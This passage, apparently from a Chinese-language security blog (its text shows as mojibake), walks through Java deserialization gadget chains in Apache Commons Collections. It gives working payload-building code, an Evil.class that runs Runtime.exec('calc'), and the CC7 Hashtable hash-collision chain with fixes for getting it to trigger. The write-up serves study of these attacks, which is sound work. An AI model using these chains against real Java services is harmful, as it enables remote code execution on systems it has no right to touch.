</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvocationHandler</span><span class="w"> </span><span class="n">handler</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">InvocationHandler</span><span class="p">)</span><span class="w"> </span><span class="n">declaredConstructor</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">IDProperty</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">lazymap</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">map</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Map</span><span class="p">)</span><span class="w"> </span><span class="n">Proxy</span><span class="p">.</span><span class="na">newProxyInstance</span><span class="p">(</span><span class="n">Map</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getClassLoader</span><span class="p">(),</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Map</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="n">handler</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">declaredConstructor</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">IDProperty</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">map</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileOutputStream</span><span class="w"> </span><span class="n">fos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;bin&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">oos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">fos</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// ä»æ–‡ä»¶ä¸­ååºåˆ—åŒ–å¯¹è±¡</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileInputStream</span><span class="w"> </span><span class="n">fis</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="s">&#34;bin&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="n">fis</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setFiled</span><span class="p">(</span><span class="n">TemplatesImpl</span><span class="w"> </span><span class="n">templates</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">values</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IllegalAccessException</span><span class="p">,</span><span class="w"> </span><span class="n">NoSuchFieldException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">declaredField</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">templates</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="n">name</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">declaredField</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">declaredField</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="n">values</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>Evil.class</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.DOM</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.TransletException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xml.internal.dtm.DTMAxisIterator</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xml.internal.serializer.SerializationHandler</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Evil</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">AbstractTranslet</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">static</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="s">&#34;calc&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">RuntimeException</span><span class="p">(</span><span class="n">e</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="n">DOM</span><span class="w"> </span><span class="n">document</span><span class="p">,</span><span class="w"> </span><span class="n">SerializationHandler</span><span class="o">[]</span><span class="w"> </span><span class="n">handlers</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">TransletException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="n">DOM</span><span class="w"> </span><span class="n">document</span><span class="p">,</span><span class="w"> </span><span class="n">DTMAxisIterator</span><span class="w"> </span><span class="n">iterator</span><span class="p">,</span><span class="w"> </span><span class="n">SerializationHandler</span><span class="w"> </span><span class="n">handler</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">TransletException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><h1 id="commonscollections7">CommonsCollections7<a hidden class="anchor" aria-hidden="true" href="#commonscollections7">#</a></h1>
<p>cc7 åˆ©ç”¨çš„æ˜¯ hash ç¢°æ’æ¥è§¦å‘ Hashtable çš„ equals æ–¹æ³•, è¿›è€Œè°ƒç”¨ LazyMap get</p>
<p>è¿™é‡Œæ³¨æ„æ˜¯<code>java.util.Hashtable</code>åˆ«å’ŒCC3é‚£ä¸ªææ··äº†</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">Payload</span> <span class="n">method</span> <span class="n">chain</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">java</span><span class="o">.</span><span class="n">util</span><span class="o">.</span><span class="n">Hashtable</span><span class="o">.</span><span class="n">readObject</span>
</span></span><span class="line"><span class="cl">	<span class="n">java</span><span class="o">.</span><span class="n">util</span><span class="o">.</span><span class="n">Hashtable</span><span class="o">.</span><span class="n">reconstitutionPut</span>
</span></span><span class="line"><span class="cl">		<span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">commons</span><span class="o">.</span><span class="n">collections</span><span class="o">.</span><span class="n">map</span><span class="o">.</span><span class="n">LazyMap</span><span class="o">.</span><span class="n">equals</span>
</span></span><span class="line"><span class="cl">			<span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">commons</span><span class="o">.</span><span class="n">collections</span><span class="o">.</span><span class="n">map</span><span class="o">.</span><span class="n">AbstractMapDecorator</span><span class="o">.</span><span class="n">equals</span>
</span></span><span class="line"><span class="cl">				<span class="n">java</span><span class="o">.</span><span class="n">util</span><span class="o">.</span><span class="n">AbstractMap</span><span class="o">.</span><span class="n">equals</span>
</span></span><span class="line"><span class="cl">					<span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">commons</span><span class="o">.</span><span class="n">collections</span><span class="o">.</span><span class="n">map</span><span class="o">.</span><span class="n">LazyMap</span><span class="o">.</span><span class="n">get</span>
</span></span><span class="line"><span class="cl">               	<span class="n">org</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">commons</span><span class="o">.</span><span class="n">collections</span><span class="o">.</span><span class="n">functors</span><span class="o">.</span><span class="n">ChainedTransformer</span><span class="o">.</span><span class="n">transform</span>
</span></span></code></pre></div><p>æˆ‘ä»¬çœ‹åˆ°<code>Hashtable.reconstitutionPut</code>ï¼Œæ ¹æ®åˆ©ç”¨é“¾æˆ‘ä»¬æ˜¯è¦æ§åˆ¶e.keyè¿™ä¸ªå€¼</p>
<h5 id="é—®é¢˜7-ekey">é—®é¢˜7 e.key<a hidden class="anchor" aria-hidden="true" href="#é—®é¢˜7-ekey">#</a></h5>
<p>ä¸éš¾çœ‹åˆ°<code>e.key</code>åœ¨<code>readobject</code>ä»£ç ä¸­æ˜¯æ²¡åœ°æ–¹èµ‹å€¼çš„ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ‰§è¡Œå®Œforåå¯¹<code>tab</code>è¿›è¡Œäº†èµ‹å€¼ï¼Œä½†æ˜¯å·²ç»è¿‡äº†foråˆæœ‰ä»€ä¹ˆæ„ä¹‰å‘¢ï¼Œæˆ‘ä»¬è·³åˆ°<code>readobject</code>ä»£ç ä¸­å¯ä»¥åˆ°<code>reconstitutionPut</code>æ–¹æ³•å¤–é¢ä¹Ÿæœ‰ä¸€å±‚forï¼Œè¿™å°±æœ‰æ„æ€äº†ï¼Œæˆ‘ä»¬è®©ç¬¬ä¸€æ¬¡foræ—¶èµ‹å€¼ï¼Œç¬¬äºŒæ¬¡forè°ƒç”¨ä¸Šæ¬¡èµ‹å€¼ä¸ä¹…è¡Œäº†å˜›ï¼Œè¿˜æœ‰ä¸ªç›¸å…³å‚æ•°<code>elements</code>è¿™ä¸ªå‚æ•°æ˜¯<code>Hashtable</code>æœ‰å‡ å¯¹çš„è®¡æ•°ã€‚</p>
<p><img loading="lazy" src="../images/image-20241108111405782.png" alt="image-20241108111405782"  />
</p>
<p><img loading="lazy" src="../images/image-20241108111842797.png" alt="image-20241108111842797"  />
</p>
<p><strong>è§£å†³ï¼š</strong></p>
<p>åœ¨putä¸ªå€¼</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Hashtable</span><span class="w"> </span><span class="n">hashtable</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Hashtable</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">hashtable</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;A&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;B&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">hashtable</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;2A&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;2B&#34;</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></div><p>å¯ä»¥å‘ç°è¿™é‡Œe.keyæ˜¯æˆ‘ä»¬ä¸Šä¸€æ¬¡çš„key</p>
<p><img loading="lazy" src="../images/image-20241108112641184.png" alt="image-20241108112641184"  />
</p>
<p><img loading="lazy" src="../images/image-20241111160712944.png" alt="image-20241111160712944"  />
</p>
<h5 id="é—®é¢˜8-hashindex">é—®é¢˜8 hash&amp;index<a hidden class="anchor" aria-hidden="true" href="#é—®é¢˜8-hashindex">#</a></h5>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Map</span><span class="w"> </span><span class="n">innerMap1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Map</span><span class="w"> </span><span class="n">innerMap2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Map</span><span class="w"> </span><span class="n">lazyMap1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LazyMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">innerMap1</span><span class="p">,</span><span class="w"> </span><span class="n">tmp</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">lazyMap1</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;yy&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;yy&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Map</span><span class="w"> </span><span class="n">lazyMap2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LazyMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">innerMap2</span><span class="p">,</span><span class="w"> </span><span class="n">transformerChain</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">lazyMap2</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;zz&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;zz&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Hashtable</span><span class="w"> </span><span class="n">hashtable</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Hashtable</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">hashtable</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">lazyMap1</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;B&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">hashtable</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">lazyMap2</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;2B&#34;</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></div><p>è¿™é‡Œæœ‰å‡ ä¸ªç‚¹éœ€è¦æ³¨æ„ï¼Œe.keyæˆ‘ä»¬è¦åˆ©ç”¨æœ€åè‚¯å®šæ˜¯<code>lazymap</code>ï¼Œè¿™é‡Œ<code>key</code>æ˜¯<code>lazymap</code>ï¼Œå€¼æ˜¯<code>lazyMap.put</code>è®¾ç½®çš„</p>
<p><img loading="lazy" src="../images/image-20241111163933460.png" alt="image-20241111163933460"  />
</p>
<ul>
<li><strong>hashCode()è®¡ç®—</strong></li>
</ul>
<p>è¿™é‡Œä¸€æ¬¡<code>i.next().hashCode()</code>çš„å€¼ä¼šè¿›è¡Œ<code>key</code>å’Œ<code>value</code>çš„hashå€¼è¿›è¡Œå¼‚æˆ–è¿”å›ï¼Œç„¶åæŠŠ<code>æ¯å¯¹hashè®¡ç®—çš„ç»“æœ</code>åŠ èµ·æ¥çš„<code>æ€»å€¼</code>è¿”å›ï¼ˆè¿™é‡Œåé¢æœ‰ç”¨ï¼‰</p>
<p><img loading="lazy" src="../images/image-20241111164926244.png" alt="image-20241111164926244"  />
</p>
<p><img loading="lazy" src="../images/image-20241111165037237.png" alt="image-20241111165037237"  />
</p>
<ul>
<li>index</li>
</ul>
<p>è¿™é‡Œindexæ˜¯hashå’Œå…¶ä»–å€¼è®¡ç®—çš„ç»“æœï¼Œä½†æ˜¯æˆ‘ä»¬è¦è®©è¿™ä¸ªindexå¯æ§ï¼Œå› ä¸ºç¬¬äºŒæ¬¡è¿›å…¥è¿™ä¸ªå¾ªç¯æ—¶<code>eæ˜¯å»è·å–tabå¯¹åº”çš„index</code>ï¼Œè¦æƒ³å¾—åˆ°ä¸Šä¸€æ¬¡èµ‹å€¼çš„å€¼ï¼Œç¬¬äºŒæ¬¡è¿›å…¥<code>reconstitutionPut</code>æ—¶ï¼Œ<code>indexè¦å’Œä¸Šä¸€æ¬¡ç›¸åŒï¼Œä¸ç„¶eå°±æ²¡æœ‰å€¼</code></p>
<p><strong>è§£å†³ï¼š</strong></p>
<p>è¿™é‡Œæˆ‘ä»¬æœ€å¥½æƒ³åˆ°çš„ä¸€ä¸ªå€¼ä¸”å¥½æ§åˆ¶é‚£è‚¯å®šæ˜¯<code>0</code>å•Šï¼ˆå› ä¸ºå¼‚æˆ–æ‰€ä»¥ä¹Ÿä¼šè”æƒ³åˆ°è¿™ä¸ªï¼‰ï¼Œhashä¸º0åŠindexä¹Ÿä¸º0ï¼Œè¿™é‡Œæˆ‘ä»¬ä¸Šé¢åˆ†æè¿‡hashCode</p>
<p>æ‰€ä»¥<code>Lazymap#put</code>æ—¶ï¼Œkeyå’Œvalueè®¾ç½®æˆ<code>ä¸€æ ·</code>çš„å°±è¡Œäº†</p>
<h5 id="é—®é¢˜9-hash">é—®é¢˜9 hash<a hidden class="anchor" aria-hidden="true" href="#é—®é¢˜9-hash">#</a></h5>
<p>é€šè¿‡ä¸Šé¢çš„å¤„ç†ï¼Œæˆ‘ä»¬åŸä»¥ä¸ºå¯ä»¥æ‰“é€šé“¾å­äº†ï¼Œä½†æ˜¯å®é™…ä¸Šè¿˜æ˜¯ä¸è¡Œã€‚æˆ‘ä»¬å‘ç°<code>ç¬¬äºŒæ¬¡çš„hashå¹¶ä¸ä¸º0</code></p>
<p>å°½ç®¡è¿™é‡Œindexå¼„å·§æˆæ‹™æ˜¯0ï¼Œä½†æ˜¯<code>è¿™æ¬¡çš„hash</code>è¿˜æ˜¯ä¼šå’Œ<code>ä¸Šä¸€æ¬¡çš„hash</code>è¿›è¡Œæ ¡å¯¹è¦<code>ä¸€æ ·</code>æ‰ä¼šè¿›è¡Œ<code>equals</code></p>
<p><img loading="lazy" src="../images/image-20241111170928859.png" alt="image-20241111170928859"  />
</p>
<p>å…¶å®ï¼Œç¬¬äºŒæ¬¡çš„keyä¸­å¤šäº†ä¸€ä¸ª<code>next</code>ï¼Œè€Œhashæ­£æ˜¯å› ä¸ºç¬¬äºŒå¯¹<code>yyå’Œ1</code>çš„hashå€¼äº§ç”Ÿçš„åå·®</p>
<p><img loading="lazy" src="../images/image-20241111171345959.png" alt="image-20241111171345959"  />
</p>
<ul>
<li><strong>è¿™å¯¹å€¼æ€ä¹ˆæ¥çš„å‘¢</strong></li>
</ul>
<p>åœ¨ç¬¬äºŒæ¬¡<code>hashtable.put</code>æ—¶ä¼šè§¦å‘é“¾å­ï¼Œ</p>
<p><img loading="lazy" src="../images/image-20241111171606882.png" alt="image-20241111171606882"  />
</p>
<p>åœ¨<code>hashtable.put</code>ä¸­æˆ‘ä»¬ä¼šçœ‹åˆ°å’Œ<code>reconstitutionPut()</code>å‡ ä¹ä¸€æ ·çš„é€»è¾‘</p>
<p>ä½†æ˜¯è¿™é‡Œæˆ‘ä»¬è¿˜æ˜¯è¦ä¿æŒ<code>hashå€¼</code>ä¸€æ ·ï¼Œä¸ç„¶åé¢è¿˜æ˜¯åˆ©ç”¨ä¸äº†</p>
<p><img loading="lazy" src="../images/image-20241111171740357.png" alt="image-20241111171740357"  />
</p>
<p>ç»§ç»­è·Ÿè¿›ï¼Œè¿™é‡Œæ‰§è¡Œå®Œåï¼Œæ²¡æœ‰æŠ¥é”™æ‰€ä»¥ä¸å½±å“ï¼Œä¹‹ç±»ä¼šç»™ç¬¬äºŒä¸ª<code>map</code>ï¼Œputç¬¬ä¸€ä¸ª<code>map</code>çš„<code>key</code>å’Œæ‰§è¡Œçš„ç»“æœ<code>1</code></p>
<p>è¿™å°±æ˜¯é—®é¢˜æ‰€åœ¨</p>
<p><img loading="lazy" src="../images/image-20241111172052720.png" alt="image-20241111172052720"  />
</p>
<h5 id="é—®é¢˜9-3è§£å†³">*é—®é¢˜9 3è§£å†³<a hidden class="anchor" aria-hidden="true" href="#é—®é¢˜9-3è§£å†³">#</a></h5>
<h6 id="è§£å†³ä¸€">è§£å†³ä¸€<a hidden class="anchor" aria-hidden="true" href="#è§£å†³ä¸€">#</a></h6>
<p>æ—¢ç„¶æ˜¯<code>map.put</code>çš„é—®é¢˜ï¼Œèƒ½è®©å…¶ä¸æ‰§è¡Œåˆ°è¿™æ­¥å°±å¯ä»¥äº†å‘€</p>
<p>è¿™é‡Œå°†<code>lazyMap2.put(&quot;zz&quot;, &quot;zz&quot;);</code>è°ƒæ•´é¡ºåºæ”¾åˆ°ä¸‹é¢</p>
<p><img loading="lazy" src="../images/image-20241111173247515.png" alt="image-20241111173247515"  />
</p>
<p>åœ¨åˆ°<code>java.util.AbstractMap.equals</code>æ—¶ï¼Œç”±äºè¿™é‡Œæ˜¯ç¬¬äºŒä¸ª<code>hashtable.put</code>è§¦å‘ï¼Œ<code>m.sizeç”±äºè¿˜æ²¡æœ‰putå€¼</code>ï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯<code>0</code>ï¼Œè€Œsize()æ˜¯è®¡ç®—ä¸Šä¸€ä¸ª<code>lazyMap1.put</code>ï¼Œå€¼ä¸º<code>1</code>ï¼Œè¿™é‡Œå°±ä¼šreturnç»“æŸï¼Œä»è€Œä¹Ÿä¸ä¼šè°ƒç”¨<code>map.put</code>ã€‚</p>
<p>å®Œç¾è§£å†³äº†è¿™ä¸ªé—®é¢˜ï¼Œè€Œä¸”åºåˆ—åŒ–æ—¶ä¹Ÿä¸ä¼šè§¦å‘é“¾å­</p>
<p><img loading="lazy" src="../images/image-20241111173353444.png" alt="image-20241111173353444"  />
</p>
<h6 id="è§£å†³äºŒ">è§£å†³äºŒ<a hidden class="anchor" aria-hidden="true" href="#è§£å†³äºŒ">#</a></h6>
<p>æ·»åŠ ä¸€è¡Œ<code>lazyMap2.remove(&quot;yy&quot;);</code>,æ—¢ç„¶æ˜¯å€¼çš„é—®é¢˜ï¼Œæˆ‘ä»¬æŠŠè¿™ä¸ªå€¼åˆ é™¤äº†ä¸å°±è¡Œäº†ï¼Œè¿™æ ·hashå°±éƒ½æ˜¯<code>0</code>äº†ï¼Œ<code>åºåˆ—åŒ–æ—¶ä¼šè§¦å‘é“¾å­</code>ä½†æ˜¯ä¸å½±å“ååºåˆ—åŒ–</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Map</span><span class="w"> </span><span class="n">lazyMap1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LazyMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">innerMap1</span><span class="p">,</span><span class="w"> </span><span class="n">tmp</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">lazyMap1</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;yy&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;yy&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Map</span><span class="w"> </span><span class="n">lazyMap2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LazyMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">innerMap2</span><span class="p">,</span><span class="w"> </span><span class="n">transformerChain</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">lazyMap2</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;zz&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;zz&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Hashtable</span><span class="w"> </span><span class="n">hashtable</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Hashtable</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">hashtable</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">lazyMap1</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;B&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">hashtable</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">lazyMap2</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;2B&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">lazyMap2</span><span class="p">.</span><span class="na">remove</span><span class="p">(</span><span class="s">&#34;yy&#34;</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></div><h6 id="è§£å†³ä¸‰-no">*è§£å†³ä¸‰ NO?<a hidden class="anchor" aria-hidden="true" href="#è§£å†³ä¸‰-no">#</a></h6>
